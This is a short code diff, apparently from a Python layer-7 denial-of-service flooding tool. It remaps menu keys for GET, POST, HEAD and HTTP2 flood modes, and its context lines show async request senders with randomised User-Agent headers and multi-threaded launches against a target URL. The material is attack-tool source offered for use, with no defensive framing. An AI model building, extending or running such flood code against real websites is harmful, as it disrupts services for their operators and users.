@@ -191,7 +191,7 @@ def layer7():
             asyncio.run(start_threads(url, num_threads, get_request))
 
 
-        elif select == "post" or select.lower() == "2":
+        elif select == "post" or select.lower() == "p":
             async def send_request(session, url, retries=3):
                 headers = {
                     "User-Agent": random.choice(user_agent),
@@ -242,7 +242,7 @@ def layer7():
 
             asyncio.run(start_threads(url, num_threads, post_request))
 
-        elif select == "head" or select.lower() == "3":
+        elif select == "head" or select.lower() == "h":
             async def send_request(session, url, retries=3):
                 headers = {
                     "User-Agent": random.choice(user_agent),
@@ -295,7 +295,7 @@ def layer7():
             asyncio.run(start_threads(url, num_threads, head_request))
 
 
-        elif select == "http2" or select.lower() == "5":
+        elif select == "http2" or select.lower() == "h2":
             async def send_request(client, url, retries=3):
                 headers = {
                     "User-Agent": random.choice(user_agent),
